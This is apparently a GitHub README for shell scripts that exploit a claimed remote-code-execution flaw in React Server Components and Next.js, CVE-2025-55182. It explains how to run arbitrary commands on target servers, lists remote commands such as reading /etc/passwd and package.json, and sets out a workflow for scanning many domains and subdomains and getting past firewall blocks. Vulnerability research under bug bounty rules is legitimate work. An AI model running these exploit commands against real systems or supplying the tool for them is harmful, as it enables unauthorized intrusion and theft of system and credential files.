# CVE-2025-55182 Scanner

*Automated React Server Components RCE Vulnerability Scanner*

![Version](https://img.shields.io/badge/version-2.0.0-blue) ![CVE](https://img.shields.io/badge/CVE-2025--55182-red) ![License](https://img.shields.io/badge/license-MIT-green)

---

## 📖 What is CVE-2025-55182?

*React2Shell* is a critical RCE vulnerability in React Server Components allowing remote code execution without authentication.

- *CVSS Score:* 10.0 (Critical)
- *Affected:* React 19.x, Next.js 14.3+, 15.x, 16.x
- *Impact:* Full server compromise

---

## 🚀 Quick Start

### Installation

bash
# Download scripts
curl -O https://raw.githubusercontent.com/yourusername/scanner/main/scanner.sh
curl -O https://raw.githubusercontent.com/yourusername/scanner/main/multi_scanner.sh

# Make executable
chmod +x scanner.sh multi_scanner.sh


### Basic Usage

bash
# Single test
./scanner.sh -d example.com -c "id"

# Quick automated scan
./multi_scanner.sh -d example.com --quick

# Full comprehensive scan
./multi_scanner.sh -d example.com --full


---

## 🛠️ Tools Included

### 1. scanner.sh - Single Target Scanner

Test one domain with one command.

*Syntax:*
bash
./scanner.sh -d <domain> -c <command>


*Options:*
- -d, --domain - Target domain (default: localhost:3000)
- -c, --command - Command to execute (default: id)
- -h, --help - Show help

*Examples:*
bash
./scanner.sh -d example.com -c "whoami"
./scanner.sh -d api.example.com -c "hostname"
./scanner.sh -d https://example.com/api -c "pwd"


---

### 2. multi_scanner.sh - Automated Multi-Test Scanner

Automatically tests multiple commands, subdomains, and paths.

*Syntax:*
bash
./multi_scanner.sh -d <domain> [OPTIONS]


*Options:*
- -d, --domain - Target domain (required)
- -q, --quick - Quick scan (4 commands)
- -f, --full - Full scan (15+ commands, subdomains, paths)
- -o, --output - Custom output directory
- -h, --help - Show help

*Examples:*
bash
./multi_scanner.sh -d example.com --quick
./multi_scanner.sh -d example.com --full
./multi_scanner.sh -d example.com -o my_results


---

## 📊 Understanding Results

### Success ✅

[+] Command executed successfully!
┌─ Command Output ────────────────────────────────┐
│ uid=1000(node) gid=1000(node) groups=1000(node)
└─────────────────────────────────────────────────┘

*Action:* Report via bug bounty program immediately!

### 500 Error ⚠️

[!] Failed - Server error (500) - Promising!

*Action:* Try different commands - likely vulnerable!

### 403 Forbidden ❌

[✗] Failed - WAF/Firewall blocked (403)

*Action:* Try different subdomains or skip target.

---

## 📁 Output Files

Multi-scanner creates organized results:


scan_results_20241208_153045/
├── successful_tests.txt    # 🎉 Vulnerabilities found
├── 500_errors.txt          # ⚠️  Promising targets
├── scan_report.txt         # 📝 Full summary
└── all_tests.log           # 📋 All tests


---

## 💡 Useful Commands

### System Info
bash
./scanner.sh -d target.com -c "id"
./scanner.sh -d target.com -c "whoami"
./scanner.sh -d target.com -c "hostname"
./scanner.sh -d target.com -c "pwd"
./scanner.sh -d target.com -c "uname -a"


### File Operations
bash
./scanner.sh -d target.com -c "ls -la"
./scanner.sh -d target.com -c "cat /etc/passwd"
./scanner.sh -d target.com -c "cat package.json"


### Node.js Info
bash
./scanner.sh -d target.com -c "node -v"
./scanner.sh -d target.com -c "npm -v"


---

## 🎯 Bug Bounty Workflow

### 1. Find Targets
- Check HackerOne: https://hackerone.com/directory/programs
- Check Bugcrowd: https://bugcrowd.com/programs
- Look for Next.js/React applications

### 2. Verify Technology
bash
# Check if site uses React/Next.js
curl -s https://example.com | grep -i "__NEXT_DATA__"


### 3. Test Vulnerability
bash
# Quick scan first
./multi_scanner.sh -d example.com --quick

# If promising, full scan
./multi_scanner.sh -d example.com --full


### 4. Report
- Document affected URL
- Include proof of concept
- Show command output
- Suggest remediation
- Report via proper channel

---

## 🔧 Troubleshooting

### Permission Denied
bash
chmod +x scanner.sh multi_scanner.sh


### curl Not Found
bash
# Ubuntu/Debian
sudo apt install curl

# CentOS/RHEL
sudo yum install curl

# macOS
brew install curl


### SSL Errors
bash
# Use HTTP instead
./scanner.sh -d http://example.com -c "id"

# Or modify script to add -k flag to curl


### All Tests Fail (403)
- Try different subdomains
- Test HTTP instead of HTTPS
- Check if site uses WAF
- Move to next target

---

## 🎓 Advanced Tips

### Test Multiple Targets
bash
for domain in site1.com site2.com site3.com; do
    ./multi_scanner.sh -d "$domain" --quick
    sleep 60
done


### Check 500 Errors
bash
# After scan, review promising targets
cat scan_results_*/500_errors.txt

# Test manually with different commands
./scanner.sh -d promising-target.com -c "whoami"
./scanner.sh -d promising-target.com -c "hostname"


### Focus on Subdomains
bash
# Common vulnerable subdomains
./scanner.sh -d api.example.com -c "id"
./scanner.sh -d app.example.com -c "id"
./scanner.sh -d dashboard.example.com -c "id"
./scanner.sh -d admin.example.com -c "id"



## 👤 Author

unkowneeror
---

---

*Happy Bug Hunting! 🎯*
